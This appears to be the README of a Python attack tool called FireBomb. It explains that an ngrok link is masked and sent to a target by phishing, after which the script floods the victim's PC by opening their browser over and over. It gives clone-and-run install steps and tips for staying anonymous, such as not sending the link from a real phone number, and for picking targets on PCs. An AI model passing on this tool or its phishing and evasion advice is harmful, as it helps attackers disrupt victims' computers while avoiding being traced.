FireBomb (Trojan-horse or Killer DoS) is a tool created by FII-Cobra, ryle-barak and naranjo15pro.
The script was made in python3 for fun, test and hacking (Ethical or Unethical).

How it works?

The script use ngrok for the HTTPS target request, it gives you a ngrok link that you
can mask to make it undetectable, when te target open the link via phishing,
the script start to bomb the target screen with a "LocalDoS", opening the target
default browser over and over again without stopping destroying the target pc/laptop

Installation kali linux/linux mint/Debian...

Sudo apt update.

sudo apt install git

sudo apt install python3

git clone:https://github.com/FII-Cobra/firebomb.git

cd firebomb

python3 FireBomb.py

final:

1) your ip is not visible if you use the tool, but make sure don't send the link
 with your real SMS or phone number

2) Please, make sure send the link as long as the target is using PC/Laptop.

3) The script doesn't works if the target use Smartphone for open the link.

Thanks to ryle-barak and Naranjo15pro to contributing.

